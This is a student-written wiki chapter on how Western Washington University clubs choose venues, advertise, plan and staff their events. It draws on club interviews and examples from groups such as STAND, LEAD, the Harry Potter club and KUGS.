The importance of an appropriate place for events can influence the attendance a great deal. If the hosting club of the event is only seasonal, many people may not be exposed to the club throughout the year. The cycling club has difficulty hosting event year round. Seasonal events will effect recruitment as well as financial help.  Clubs like the strong man club have more access to indoor and outdoor events. 

The idea of event placement is to draw the biggest crowd possible by attracting as many passers-by possible.  It helps if the event is in a wide open area that many people walk by regularly.  It also helps if the event is in an area where sound travels easily so that the event is easily notice. Also if the place is easily accessible by bus or on campus makes it easier for students to attend.  Much how the croquet club would hold events in front of Old Main, the WWU Bodybuilding Club held their WWU Strongest Man Competition out on Western's Track.  The track was an excellent location because it allowed them to draw in everyone making their way too and from the Rec or parking lot. The event was able to be seen and heard from a long ways away which led to a large crowd and a successful event.

Sexploration is a club on Western Washington University campus that depends on privacy and confidentiality. In order to achieve this, the leaders must use a location with no interference during meetings and events. In order to hold the meetings in a safe environment, that is needed for the discussion of such taboo topics such as 'better sex' and 'casual sex'. These locations are usually a classroom or a meeting room in the Viking Union. These rooms are reserved and the doors are closed during a meeting in order to insure privacy and creating a comfortable environment to discuss sex. For Sexploration the place of the event is key to the success of their organization.

The Croquet Club has been able to host many events directly on the Western Washington Campus. This is an easy way to promote the club to by-standers. Such themed events like Alice and Wonderland and St. Valentines Love have been some of the major tournaments this year. Unfortunately, clubs like the KSA have been unable to host any events for the last two semesters because of lack of support. But by end of they were able to organize two different events. One event was inviting a speaker who could explain about Korean culture. It was hosted in the regular meeting room at Miller Hall. Another event was Barbecue party at the Barbecue place in Birnamwood Apartment. Both of them were open to everyone who was interested to share the time and learn about Korean culture. Places for both events were not bad choices for club members to share their enjoyment. However, it was neither well advertised to other members nor get other people’s attention about the held events.

The Campus Christian Fellowship (CCF) meets in a very convenient place for most students. The place of their events are typically in Bellingham, and if traveling is needed, then transportation is provided.  The weekly services that are led by CCF are in Arntzen Hall 100. This is on the south end of the WWU campus. What this means is that most students can walk to the event and not have to worry about finding a ride to and from the service like one does on a Sunday morning.  Related to the place of the event, I think another important topic is the time of the event. You do not want an event that conflicts with a lot of people. So what CCF has done, is they have established a time (7pm-9pm) on Friday nights where students plan their Friday night events around the service.  With a time from 7-9 and a close location for most, CCF is able to keep the attendance at this event very high. That alone has helped to club succeed. CCF does not have the struggle of, if 15 people do not show up, then the event is not worth continuing for that session. Other smaller groups like the A'Capella group for example, really have to count on all participants coming to each meeting.  The meeting place for groups like those is even more significant because it has to accommodate everybody, not just majority of the people.

The key to many successful events really is location, location, location.  There may be some other factors that come into play, but deciding when and where to hold an event is vital.  Depending on the type of group event, locations will vary, but their importance will stay the same.

===Advertising Events===

Effective advertising is crucial for promoting club events. A variety of advertising methods are utilized, from print ads in the school newspaper to hand-made pamphlets and fliers. Social networking websites such as Facebook and Myspace allow club members to spread the word about upcoming events quickly and efficiently. Advertisements get the word out to fellow students and inspire potential club members.  

The Sexplorations club communicates through Facebook mostly and uses posters throughout campus to advertise their meetings. This has been a good method for them to get a turnout at their meetings. 
The leader sends out an invitation through facebook to all her friends asking them to attend club events. posters are another effective way to advertise a safe place for young ladies and men to talk about their sexual life.the club also uses attractive names for events such as Multi-Gender Sexploration: Secret Share

Advertising for KUGS reaches thousands of people. KUGS is involved in many on campus events, which draws the attention of many students. Also KUGS can be played on Comcast channel 980, as well as a webcast, so they reach listeners around the world. KUGS has special events such as Music for the masses, which is a great way for them to advertise. The fan base that KUGS has established is another great way for them to advertise, because the more people who play their station the more people who will listen, and this leads to more people knowing about them and becoming dedicated listeners. The KUGS homepage is also a good way to advertise because it is found on the WWU website, which students use daily.

The Strong Men club knows how important advertising is to the success of their events.  Some of their most effective means of advertising come from resources that are available to all students on campus.  They are able to print out free flyers for their events in the Viking Union.  They can then post these fliers in busy areas on campus to attract more people to their events.  One example of a group that failed to advertise well is the Cycling Team.  They had to cancel the triathlon that they were hosting because of inadequate advertising.  Without enough advertising a club's event simply won't be successful.  It is very important to use the resources that are available to all of us on campus.

The Harry Potter club posts events on Facebook but also creates flyers and posters for larger events (such as the Yule Ball). These posters are usually in very public places like the VU or bulletin boards in various buildings and dorms. However, the flyers are often placed in more creative ways. Members of the club are given a handful of flyers and allowed to post them all over public sights but they also hide them or leave them in interesting spots. They could be left on a desk in the library or classroom and even on shelves in the library creating curiosity to anyone who sees the flyers. They also advertise events, at the Red Square information fair. This is where a large number of people see the events that are going to be going on in the club. The Red Square info. fair is one of the biggest ways that the Harry Potter Club advertises for events that are going on, or being hosted by the club. 

Associated Student Productions relies on advertising for everything.  They put up several posters throughout campus as well as also posting Facebook events.  In doing this many students hear about the events and the word gets around.  However, this is not the only way ASP gets the students attention. They also have people who dress up for the occasion of the event and stand in Red Square, which is where most of the heavy school traffic is, and promote the event by handing out flyers.  Another thing that is great that the organization does is sent out text messages to those who would like information on upcoming events.  All of these tactics help ASP in getting students to be notified and attend their events.

Western’s own radio station, KUGS is known for its diverse music and its constant goal to meet its listener’s preferences. This organization is all about music, so it is easy for them to put on events without taking drastic measures to publicize the event. Their approach is simple; blast music from any place on campus, recruit student  who know what their demographic likes, and wait for students to follow the noise. As more and more students are lured by the music, the station finds an easy way to promote their radio station and at the same time talks to students in order to find out what kind of music they like and what will please the Western student body. Other clubs such as the Pacific Islander Club, hold large gatherings. The Pacific Islander Club just had a big event but students had to pay a rather large fee to attend. KUGS’ events are different in that playing music is rather inexpensive so outreaching to the student body is easy and free!

===Type of event===
Clubs at Western are diverse both in their specific interests as well as their activity choices. You are bound to find something to spark your interest from the numerous clubs on campus whether it be dancing, outdoor adventuring or just meeting to sit and talk with others. The types of events are important to support diversity here and to offer something for everyone. It really is up to the students; the events and activities put on in clubs are for the most part our choices. So, keep your eyes out for signs, flyers, word of mouth and just about any other form of communication and find that something that catches your eye! Maybe take a read through this section as well for an idea of all that campus clubs have to offer in ways of events. 

A strength STAND has is having different types of events.  They host between 4 and 6 events a year and they make it a weeklong event.  They show movies, they have discussions and bring in guest speakers; they do as much as they can to get the word out about their statement and what they want Western to know.  As well the club LEAD, it does a great job on types of events.  They interviewed Marie and she said they have about 3 work parties a weekend, in different places, to clean up around Bellingham and it’s not just for WWU students its open to the public as well.  Most of LEAD’s work parties are full so they get a lot of cleaning up of the environment done every time.

The Women in the Woods group hold many different events. They usually plan outdoor excursions like hiking, skiing, snowshoeing and many other things. The purpose is to get outside and to meet new people. They also hold events like showing movies which they feel can be beneficial to understanding the outdoors. Big or small these events are opportunities breath in the fresh air and gain a better appreciation for mother nature.

A. The WWU cycling team tries to host Sporting events on campus. Other clubs such as the Bodybuilding Club do the same however the Cycling team races all over campus. This is their most common event however they occasionally must hold fundraising events to finance their activities. The club can race all over Bellingham and at various meets and invitationals. These meets can have many teams competing at a large gathering of other cycling teams.

The Planned Parenthood club hosts several of createve events around campus and the community. Some examples include &quot;Free Condom Friday&quot; which is when they pass out condoms at a table on campus and also &quot;Thirsty Thursday&quot; where they pass out condoms outside the bars when people are drunk or are drinking and could be ready to have sex. They also participate in several events around the community where they pass out free condoms and information about testing for STIs. Basically, they are getting the word around in the most effective and creative ways.

It is possible to run into problems promoting positivity with subjects that are sad and deal with others suffering. The Slum Doctors Program Club here on campus counteracts this problem with events that incoorporate a relaxed and informative environment in which movie watchers can be educated and understand gravity of human rights issues around the globe while simulatniusly offering a condstructive environment in which to offer each persons in attendance help.  

Sports clubs have the advantage of being able to host tournaments.  The SMASH club hosts several Super Smash Bros. tournaments each year in an attempt to recruit new members.  Also, Smash is popular enough that other organizations host events that involve Smash tournaments.  For example, Ridgeway has hosted several parties this year that included video game tournaments.  The leaders of the SMASH club take on the responsibility of attending these related events to recruit more members.  Any sports club can use tournament events to add excitement to their club and recruit new members.  The Croquet club has also hosted tournaments, but most of the student population was not even aware of the tournament.  In order to have successful tournaments and recruit a lot of new members, a sports club needs to heavily promote its event all around campus.

Sexploration is focused mainly on hosting one type of event; meetings. Although they occasionally host larger group gatherings. Meetings consist of statement of the club creed/mantra where leaders (two of them) explain the point on the club and the idea that within the club there is a safe space that guarantees no one discusses what was said in the meeting outside of the meeting. The meetings are fairly informal aside from the initial tradition of stating the creed, they then restate the topic for the week and let people discuss. Generally the leaders of the club have a &quot;hands off&quot; approach and like to let people attending the meeting, aside from themselves contribute. However, they will contribute comments if there is a lull in conversation. In addition, they emphasize contributions from everyone at the meeting, and not too much from one particular person. It can be compared to STAND in that Sexploration hosts discussions for their meetings, however while Sexploration has one particular kind of event and that alone, STAND hosts a variety of events such as movie viewings. In addition, the two can be compared in that they both have specific kinds of statements of purpose that are explicitly stated.

The Yes! Club strives to promote a positive environment by promoting a stress-free and violence-free environment. They encourage this by offering events like free yoga and meditation to the Western Washington University community. Another pillar of the Yes! Club is spreading happiness and acceptance. The club also organizes this type of display on campus. This can be seen through Yes! Club students walking through Red Square with &quot;free hugs&quot; signs, where they hug and high-five students walking through campus. This type of direct interaction is similar to the Planned Parenthood Club, which also spreads awareness and information about their club throughout Red Square. Western's Yes! Club is part of the Yes! Clubs that are at many universities all throughout the nation, so while the events may differ from school to school, the principles on which the club was founded on are very similar.

The Student for Optional Clothing Club, attending events are mainly what the club does, since there are not really meetings persay for this club. Therefore, they show their pride by attending events, such as the naked bike ride in Seattle, WA. Meetings and events for this group are challenging because of the difficulty in finding locations where being naked is okay, however in most places, it is looked down upon. When events, such as the naked bike ride, arise, the group takes no chances in passing them up since opportunities are narrow. This club researches for events, as well as several meetings with a non-university related nudist group, once in a while. These events and meetings give the group time to feel free and show their spirit.

A. While not as...strange....as the Students for Optional Clothing Club; The Dead Parrots Society, despite seeming like just an improv comedy group, has many different types of shows.  The inherent flexibility in improv makes it quite easy to make many different types of shows, based on what type of comedy the group wants to do at each performance.  Game shows, story-telling, etc. - The Dead Parrots Society has almost limitless ways that they can organize a show, making it a very good choice as a comedy-style group for students to join or participate in, whether as audience members or as members of the comedy troupe.

Throughout the year, the Harry Potter club has many events but only one large one (the Yule Ball). Anyone is welcome at the events which usually happen around other holidays or important dates regarding Harry Potter movies and books. 
Events include: 
•	Sir Nicolas’s Death Day Party
•	Slughorn’s Christmas Party
•	The Yule Ball
•	Lockhart’s Valentine’s Day Party
•	Movie Nights 
•	Quidditch


	Just like the Harry Potter club, the rugby club hosts a few special events throughout the year in order to make the club popular within the western community. They host these events in order to find new recruits and build a fan base. By attending the annual club days in red square, the rugby team is able to attract and to encourage new people to explore a different and obscure sport. This method has worked well historically but current members of the group have expressed concern about its continued effectiveness. The rugby team also hosts an event with the alumni of the team to fund raise and keep in touch with the team's roots. This event is called alumni weekend. It consists of an alumni golfing tournament where the current players caddy for the alumni, and an alumni game. The alumni game is one in which the current players on the team play a 'friendly match' against the 'Old Boys,' or the alumni. This game attracts a lot of support from the friends, family and players that have at some time been involved with the organization. Since the referee in this game is an alumni himself, it usually turns out well for the old boys. In addition to these alumni games, the club sometimes organize tournaments to play against other teams in the region(usually happen during summer).

A. The Western Strong Man Club has used an unorthodox method of fundraising. They sold &quot;Jell-O Shots&quot; at a party off campus. They realize the legality of the issue and said that they did feel guilty about it. It did, however, make them a fairly large amount of money and the method has funded them quite well throughout this year. They found a niche for fundraising that no one else has and it has been very effective because of this. Being well connected with students and knowing what is in demand has helped them become successful.

The WWU Body Building and Strong Man club hosted the first strong man competition on Saturday, May 30, 2009. The event was held on the University Campus Track and Field. Awards were handed out to the strongest men in both the light-weight and the heavy-weight categories. The event was free to attend and it generated a large and intrigued crowd! Everyone had a great time and the club will most likely hold another competition in the near future.

===Average number of people at events===
	In an interview with Brittany Smith from the ASP Popular Music office one of the strengths was keeping the attendance at their events high despite the struggling economy.  By providing subsidized costs to students and making sure they program a diverse range of events ASP is able to draw on the passion of our students for different events.  Along with Pop Music selling out most of its shows this year, ASP Special events also sold out Western’s Main Stage with Sue Johansen, and Civil controversies maxed out their capacity with their event on Politics and the Economy at the start of the year.  This strategy of targeting very passionate needs on campus is also seen in the Tango club.  In Laurie Yearout’s interview with one of their members, they also found that students are willing to pay for events if they are very passionate about them.  This excellence in keeping numbers high is reflected in ASP Popular Music’s recent award for “Event of the Year” at the annual End of the Year banquet hosted in Western’s VU Multi purpose room.


	When I interviewed Linsdey Delaney who is a senior member of the Submarine team at Western Washington, I found that one of the things the club lacked in the most was keeping a consistent number of people attending the club.  Based off what delaney told us it seemed there was a very few number of people attendend the club.  She explained that it was difficult to organize meetings because of the fact that there were so few members.  I suggest that to improve the average number of people that attend the group meetings they should get the word out that the submarine team even exists at western.  I find it to be a very interesting club.  Just the fact that being apart of the club gives you access to the engineering department at the school.  It would be very interesting to use all the tools there and have the knowledge to understand how the tools work and be able to use them.  The club its self just needs a way to increase the number of members in the club so the average number of people attanding the meetings go up.

 
When I first attended a meeting with some of the other members in our group to the sexploration club, I noticed that there were not many girls already attending the meeting. This may be due to the fact that it was the first sexploration meeting of the quarter, or simply because of the fact that the level of advertisement for that particular meeting was lacking compared to others. However, there were a few members there (about 4) who were interested in joining a discussion on sexploration. Sadly, the leader of the group decided not to hold the meeting, as a result of the low number of active participants. These girls that were once excited to contribute were now disappointed and discouraged to come to other meetings that may have just as well not occurred as this one did. However, the leader was unaware of the fact that some of the members did want to contribute regardless of the number of participants present and therefore should not be blamed in any way for this incident. On the other hand, I feel that an effective way to go about organizing and presenting a club is to fulfill the activities that are planned, including meetings. I know that the salsa club still holds meetings, even if there are not enough particpants to make up one of their levels (intermediate, beginning, advanced) and they still hold the activity by incorporating one of these into another level if there are not enough participants. Therefore, one effective strategy for club organization is being very strict about fulfilling the activities you plan, as to create loyalty and trust in your members and participants.

The croquet club has a interesting situation in terms of number of members, there can be too many people at a meeting based on how much equipment is there.  This is very different than talk based clubs, like sexploration, where there is no equipment necessary.   In an interview Devin said the regular amount of people was between 10 and 20.  The way they work this out is, Devin, the president of the club, sends text messages and sends out a facebook invite to current members instead of putting up posters.  This method works well for their situation because it gives the leaders of the group a good ballpark number to how many people are coming.  The problem with poster invitations is that you can't know the number of people coming to the event.  Knowing the number of people coming to your event allows for the organization to provide the correct amount of resources. Resources can consist of equipment of snacks, both of which there can be too much and too little of.

==Volunteer Opportunities==
In many cases events can't be entirely managed by the organization that hosts them. By volunteering to help at these organization events it gives people the opportunity to support organizations that they appreciate and are interested in without committing to a long term engagement. Some organizations regularly ask for volunteers, such as non-profit aid organizations. Others may just need a hand here and there while hosting events. These volunteers are an important link between the organization and the rest of the community. Volunteering can be done on both the group level and the individual level. An example of people volunteering together is a church group that builds houses in Mexico. One does not need to volunteer with other people however. There is plenty that an individual can do to help.
===Individual===
Effectively organizing volunteer opportunities for individuals to partake in is an important skill for clubs to develop in order to be effective student organizations.  One club that is very successful at organizing volunteer opportunities for individuals is the environmental group LEAD.  They accomplish this through various means of advertising, including their organized and efficient website that individuals can use to view information about the club, view volunteer event opportunities, found out when and where the volunteer events will take place, and register for volunteer events.  Les Kaahaaina discusses this organized and efficient website when she stated that &quot;another asset is their ability to efficiently sign up volunteers through their website&quot; and Connor Roberts echoes this fact by stating that &quot;they [LEAD] seem to have a very efficient working system.&quot;  Although none of the other clubs listed use their website to aid individuals in volunteering, clubs such as Sexploration and Slum Doctor Program could greatly benefit from this skill employed by LEAD because they need more volunteers.  To sum, LEAD's use of an efficient and organized website to recruit individuals who want to volunteer is a very important skill that many other clubs could greatly benefit from learning about.

I think that is very important for people to find a way to give back to their community through a volunteer project.  You are lending a helping hand to people and organizations.  There are benefits that you gain as an individual, opening yourself to learn something new.  Volunteering opens doors to new friends, recommendations for future employment and college applications, developing marketable job skills, and even increasing your self-confidence.  Despite these personal reasons you will gain, others impacted by your choice will gain more than what you will gain yourself.  A couple things I have done is volunteer with the LEAD organization on Earth day.  Not knowing anybody, I marched down to Franklin park with a group of people to pull weeds and non-native plants in order to restore the beauty in the park and allow it to be enjoyed by the community residents.  This park was once losing its beauty and value but as more people decided to help and lend some of their time; it has now gained pathways for kids to enjoy exploring.  Another thing I have done is volunteer computer skills to middle school students at home.  I would come in and help them compile their yearbook using Adobe PageMaker and InDesign.  Not only did I gain an opportunity to keep using these skills but I also gained an opportunity to build relationships with these younger students and am still able to give them advice and guidance when they need it.  Volunteering motivates others to take a step out of the box and realize that helping those less fortunate or in need can impact not only them, but yourself, the community, the future.

===Group===


===Students for Disability Awareness===
 
Recruitment of &quot;full-time&quot; SDA members may be low- about 11- but the club continues to be successful through the effective use of volunteers.  The SDA club hosts events such as &quot;Disability Awareness Week&quot; at Western, which brings in speakers from around the country and hosts events for everyone to participate in.  The club has also recently sent a student to Taipei, Taiwan to compete in the Deaflympics by fund-raising about $300 for the student's travel expenses.  While none of the events and fund-raising happen if it weren't for the dedicated members of the SDA group, those same events would not be possible if not for volunteers; simply because of the shear size of the activities that the SDA creates and hosts.       

Vice President and Co-founder of SDA Brittany Otter said during the &quot;Disability Awareness Week,&quot; the club recruited over 60 volunteers to help coordinate the events; this included students from the Ally Building Network and the Western Leadership Advantage class.  This successful recruitment of volunteers seems to be the opposite of what most clubs are currently experiencing while trying to get help for events and accomplishing goals; such as the Student Homeless Outreach Program, which only has four members and, according to Meagan Acdal, &quot;spends the entire quarter preparing for [one event].&quot;

Otter said the SDA club has approximately 200 people on its email service, who are notified about upcoming events and what they can do to contribute.  As stated on the SDA website www.wwusda.org, volunteers help out the club by creating posters,setting up booths and stages, handing out fliers and greeting people.  This combination of dedication and effective use of volunteers has the SDA club geared toward its mission of spreading awareness and to educate the WWU community about the disability culture.

Also contributing to the strong volunteer turnout was the SDA club's involvement with local disability support services such as Access Living Inc. In doing so the SDA club was able to recruit support staff experienced in advocating and supporting those living with disabilities. This relationship also helped to involve others living with disabilities in the events and activities of Disability Awareness Week. Clients receiving support services from Access Living Inc. participated in the art contest, the wheelchair races and were able to attend the comedy act performed by Josh Blue. Some of Access Livings disabled clients volunteered in support of the events as well.

==Reason For Events==
Events are hosted by clubs for a myriad of reasons- whether it be to educate, promote awareness, raise money, or even just for run and enjoyment. Reasons for hosting events usually vary based on the club's purpose. For example, ethnic student clubs may be more likely to put on events that share their culture, where as clubs devoted to a cause such as Men Against Violence or Students Against Civilization Club may host an event to educate or create awareness. Whatever the reason is for hosting, the main point is to unite people for understand different perspectives on different topics.  

===Recognition===

It is possible to use an event as a launching point for your club or organization. For example, the club &quot;Against Civilization&quot; at Western Washington University was not well-known when the leaders brought a famous environmental issues author to speak at the campus. This event promoted the club and made the Western community more aware of them. If you publicize an event well, and it is memorable, people will not only recognize that your organization exists, but what the purpose is and what they are capable of. Whether you have a great turnout or not, the people in attendance will already have some kind of interest in order to attend. You can use this as a recruiting tactic, or go the less aggressive route by simply letting the community know that such a club is available.

===Educational Events===
For the Students Against Civilization Club, educational events are the most necessary and important events to host, and it is these events that have led to the relative success of this organization. Although these events are not necessarily highly attended, new members can only be recruited when the motivations for this club's existence can be explained in full - most students might not recognize at once why one would have a problem with the general idea of civilization. Predominantly educational events become a necessity in clubs such as this (others include World injustice awareness, Coalition for immigration rights, STAND, etc.) when substantial background knowledge and context is required to appreciate the aims of said organization. The real trick is to effectively engage your audience while still conveying your crucial points - lecturing at potential members can only take you so far. Multi-media presentations, such as film strips, documentaries, and slideshows, usually serve as a good centerpiece/main attraction for an educational event. Guest speakers whose topics are pertinent to your organization are also a valuable resource, and are usually in abundance in a college environment.


Like the Students Against Civilization Club, the Students of Optional Clothing club occasionally hosts educational events involving documentaries and film strips. They hosted an event where they showed a documentary on the World Naked Bike Ride in London. This video was particularly relevant to new and unfamiliar club members because it helped put public nudity in perspective. The documentary showed how public nudism could be used as a form of protest because of the attention it draws, it also explained how it was easier to be naked in public when others are doing it with you. After the video, the club had a brief discussion about the documentary and how it was relevant to the club. Film presentations combined with discussion can be very helpful in better understanding a group and their practices.

The main goal of the club STAND is to open people's eyes to genocide. STAND hosts four to six major events per year. Events like their movie night about rape attract about 15 to 20 people but their larger events, like those held in the open part of the university outside, attracts hundreds of people who want to learn more about genocide. The club brings in guest speakers and shows movies as well. Their biggest event is called &quot;Week in Genocide&quot; where every day there are tents and stands outside in the university square that not only discusses genocide, but shows pictures and documents from past and current genocides to students who are passing through. Every day of the week during &quot;Week in Genocide,&quot; an event is held like watching a movie or documentary about genocide or bringing in a guest speaker. This group is very successful in using these types of events to spread the message about genocide.


===Cultural Sharing===
Being a student on a college campus is a unique experience for many reasons. However, many people would say that they were exposed to a vast number of unique people and cultures that they had not been exposed to prior attending college. Western's long list of AS activities and clubs enhance the culture experience and create rich diversity. Without the clubs and events that take place on campus daily, culture would not be felt, sought after or shared.

As a club dedicated to the sharing, learning, and appreciation of a certain culture, FASA's (Filipino American Student Association) strength is in planning and hosting events. FASA holds many successful events to celebrate their culture by showcasing its members' talents, presenting traditional Filipino dances, offering authentic Filipino food, etc. This year, FASA had two main events- the annual Heritage dinner (held Fall Quarter) and the first Annual Pilipino Culture Night (held Spring Quarter). When holding a cultural sharing event, FASA likes to reach out to the Western community as well as the larger Bellingham community. Jazz Allen Espiritu, FASA's current Budget Authority, mentioned in an interview that “With Heritage Dinner we were able to invite the whole university to a culture sharing event that was fun and entertaining for anyone who went. It was a time to learn and a time to enjoy friends and family which is universal to everyone regardless of ethnicity.” FASA, like any other cultural club, must put effort into reaching out to others for events like these in order to get the club recognized as an organization open to diverse people, and not just people of Filipino backgrounds. The events held by FASA, as well as the club itself, is similar in effective organization to the Hui O' Hawaii club and the events they host, such as the annual Luau. Both clubs are culturally based and even share mutual members.

A) One are where the Jewish Hillel Club succeeds greatly is by creating a place where students who share a common cultural background can come together and strengthen those common ties and create friendships. Sarah Rasmus, the Vice President of the Hillel Club during the 2008-2009 school year, explained that the clubs goal was to &quot;create a safe environment for Jewish students on campus to express themselves as individuals.&quot; Some of activities the group does together are hosting dinners on campus, getting together for movie nights, and playing games that strengthen their cultural ties, such as &quot;Jewpardy.&quot; They try to get a Jewish member from the Bellingham community to host a dinner for the club as often as possible as well. One aspect Rasmus likes about the club is that it is &quot;a safe environment to meet other Jewish students and practice and explore Judaism on their own terms.&quot; The group informs its members of upcoming events through their Facebook page, something that will undoubtedly become more popular among campus clubs. The Harry Potter club also succeeds in creating friendships within their group. Some of the way their group gets together is by hosting concerts with wizard bands, playing quittich, and by hosting a Yule Ball.

What consistently keeps the alumni weekend happening year after year is not the amount of money that the Western rugby team generates, not much according to many members, but because of the shared cultural experience that the different generations get to share and pass on. Brian Jensen, next year's club president, is very enthusiastic about this cultural sharing: &quot;This year's alumni weekend was fun because the alumni make it that way. After I graduate, I will continue to come back every year because of how much I enjoyed the stories, the people and the game.&quot; Parties might not be considered an official club gathering condoned by the Student Body, but members of the team thought that these gatherings were probably one of the most effective ways to create camaraderie and a better team dynamic.

===Fun===
The amount of fun that can be predicted from an event can be influenced by many factors. Amount of preparation, good attendance, activities offered and weather can all be factors that play into the success of a fun event.

Hui O' Hawaii, a Hawaiian cultural club on campus, was most effective in their ability to host events. Like Slum Doctors Program, Hui O' Hawaii had a mix of events and awareness. Essentially, the events that they hosted were intended to allow people to enjoy themselves and tangentially learn at the same time. Their events consisted of Luaus so there were lots of great dancing and delicious food. However, they were more than just a good time. The Luaus also served to spread awareness about Hawaiian culture. Their goal is to give people a feel for the culture and to hopefully enjoy it. This was intended as a way of raising awareness about the cultural practices of Hawaii in a light and respectful manner.

Many of the Hui O' Hawaii club's events are not always made public.  However the group themselves are always usually putting on their own private events, such as going to Kathy's Kitchen in Seattle just to eat homemade Hawaiian food.  During an interview the club agreed as a whole that their best times are when they are eating Hawaiian foods. Some of their public events are offering Luau dancing lessons at the local YMCA and putting on an annual Luau at WWU. Lessons offered at YMCA give the public, who may not know of the club on campus, an opportunity to learn a little bit more about Hawaiian culuture and their ritual dancing steps.  The Luau is their greatest event and is effectively advertised for weeks before its actual occurrence.  They sell Hawaiian merchandise, serve Hawaiian food and put on dances for the audience.  Natives from Hawaii are also there to participate and help the club members.

The Croquet Club, like The SMASH club, host fun events with different rules to spice up every event they have. They do this to create a completive environment, so that everyone has a fun time.  They play games on different tournaments and the winners are awarded points for whatever place they come in. The person with the most points at the end of the tournament gets a prize. They setup different rules when playing in teams rather than when the play a singles, nonetheless they make their own rules. Sometimes they make the brackets a portal to another bracket across the field, or they play bonus brackets on special occasions. On Halloween they played if you hit the croquet ball through two pumpkins, you would be awarded bonus points. They spice things up to keep the game fresh and to keep it away from the stereotype of being a &quot;grandma's game&quot;.

The South Asian Students Association club tries to host one big event, and several smaller fun events. Last year, they hosted a large event to show the different dances, music, and cultures of the south  Asian world. This event is open to the whole campus and other people from different schools are encouraged to attend as well. Along with this event, the club tries to host a couple of get-togethers. A member (usually an officer), hosts a party at their house, where members are allowed to attend and bring their friends. There have been bowling and dinner nights in the past too. In the future, the SASA club definitely wants to continue this tradition of having smaller events at someone's house so it can lead to a more comfortable and relaxed environment where people can get to know each other and just have fun doing something other than school.

The Harry Potter Club's events are similar to the South Asian Students Association club in the idea of one main event, and then several smaller ones. First, they host their Yule Ball every year, to which around 300 people attended this year. They also hold events such as Quidditch matches on the Old Main field every weekend or so. Both these events and their booth at the fall quarter info fair I believe is a good way to get there name out there more and more. Perhaps is they have another event like the Yule Ball, or hold one more often, say once a quarter, they could influence growth and the students on campus may have a stronger connection and awareness on campus

The Planned Parenthood VOX Club hosts meetings every Wednesday night in Viking Union. Although these meetings are very informative and helpful, Kelsey (the club's coordinator) also knows that the only way to appeal to everyone and to hold strong membership is to keep the meetings fun also. The way this is organized in the meetings is by keeping a laid back and comfortable attitude during the meeting discussions. For example, in the meeting my group attended, we found that they were not afraid to make funny jokes and talk about sexual topics (relating to healthy decisions) at all and this made the meeting fun and interesting. It was so entertaining and energetic, that you could really see that the people had a passion for the cause and time flew by while they were doing it. It seemed more like a bunch of friends hanging out rather than doing some work, while still getting things done. This &quot;fun&quot; attempt is also shown my The Scottish Country Dancing Club and The Hui O' Hawaii club, where they include dancing and games in their meetings and events to appeal to the community and members of the group so they not only learn but have a great time. Keeping the club's meetings fun and entertaining is a very important strategy in maintaining an effective club.

The Students of Optional Clothing's official goals are to &quot;provide a positive, safe and nonsexual environment for addressing and investigating the cultural and somatic roles of clothing, create a community supportive of personal choice of dress (or lack of dress), and become comfortable with our natural forms and improve body image.&quot; However, a large part of ensuring those goals are met is ensuring that club activities are fun. Making events 'fun' is especially important considering the unconventional nature of the club. New members may feel awkward or self-conscious about dressing down - humor is an important tool in lessening members' nervousness. Like the Planned Parenthood VOX club, SOC's leaders ensure that club activities are laid back and use their humor to connect with interested people. SOC has found that doing silly things like playing board games naked can make new members feel more comfortable.  They also recently organized a &quot;Naked Hoe-down,&quot; an all-night-long event with live music. Not only is this concept also a little silly, but it  sounds a lot more fun and interesting then just sitting around being naked, and the near-guarantee of some ridiculous situations is almost relieving. Since SOC must be creative when it comes to figuring out what kinds of events to plan (conventional &quot;naked activities,&quot; like skinny dipping, are difficult to organize as public nudity is generally illegal), this accomplishment is critical.

The Associated Student Productions were responsible for a wide variety of events among campus. They host events such as films, concerts featuring local and well-known bands, open mic nights, and even lectures featuring controversial issues and many guest speakers. The most interesting and energetic of the ASP offices is the special event programs.  Striving to bring delight and unity among the Western community, they feature anything from rap concerts and hydraulic car shows.  Some other events of the past include Cirque de Flame (fire circus), the Ralph-Nader lecture, and visits from Ice-T, The Shins, and Techni9e.  Successful at hosting events, the Associated Student Productions strives to bring entertainment to Western Washington University.  Like the KUGS was Western Sound Federation, KUGS-FM mission is to serve the students of WWU in Bellingham, WA by providing a diverse program of music and information consistent with student interests.  They are also staffed by students and consist of community volunteers.  They serve as a bridge from the University and the surrounding community.  One way that these programs stay effective is through organizational skills.  Organizational skills are important when it comes to utilizing them in everyday life and especially in events that require the benefit of more than just oneself.  One effective organizational strategy is one of a visual concept.  Checklists ensure that all steps or procedures are followed in plain view.  By utilizing organizers whether they be graphic organizers, checklists, subtitles, outlines etc. you are breaking down all the items that are to be included in assignments and provide goals be reached and ensure that checkpoints are in place.  Agendas assist in keeping in place everything that needs to get done in a timely manner so that thoughts are not all jumbled up and things forgotten.  You can see the way that this is utilized by these programs through their websites in which they post all events ahead of time for others to view and know what is going on.

The Western Strong Man club does not have many fun events.  The purpose of this club is more one of self gratification.  The fun of this club is the self gratification a person gets from betting his or hers self image.  Unlike the Hui O' Hawaii club that hosts Luaus to have fun and raise awareness. The Western Strongmen do not hold many events but having the know how and ability to make oneself look and feel better along with better health and awareness.

The Associated Students and Ethnic Student Center Clubs strive to make clubs enjoyable and for anyone and everyone. By hosting events, competitions, contests, etc. students are able to come together outside the academic work environment to have fun and learn something new. The point is to expand beyond what we are used to and meet new people which is what college is about.  If we didn't have the ESC and AS clubs it would be detrimental to college life as it would hinder our attempts to make new friends and broaden our horizons.

The Dead Parrots Society hosts and attends events such as festivals and competitions where they compete with other teams, or just simply to showcase what skills each parrot has and to make the audience laugh. In interviews, the members explained the importance of making the audience happy and how that makes them feel. Some parrots even find the audience reaction to be the best and most fulfilling aspect of the club. Although they can win awards and use these events to further their career as well as using it as experience for future acting/improv jobs, the festivals, because they are so low-key and fun the primary reason for them is to have a good time.

===Promoting a Message===
Although Against Civilization's in group discussion can be broad and unfocused at times, they do have some main points that they wish to convey. Recently Against civilization paid to have Derrick Jensen ([http://derrickjensen.org/index.html])to come speak at Western Washington University. While the event itself wasn't a leadership drive, every seat did have a brochure describing Against Civilization's views and had all of the contact and meeting info necessary for an interested person to get involved with the club. However, the focal point of the night wasn't the club, rather it was Derrick's radical message that Against Civilization's founding members are very much against. Being such a radical message, it was important that the event attracted people of like minds first and then presented them with a club that shares ideas second. By doing this Against Civilization has focused its recruitment methods, and at the same time promoted a message. While not promoting a message I think other clubs, for example the Harry Potter club, can use a tactic such as this to recruit members. While a Quidditch game or a Yule Ball might not promote a certain message, it would definitely bring people of the same interest together.

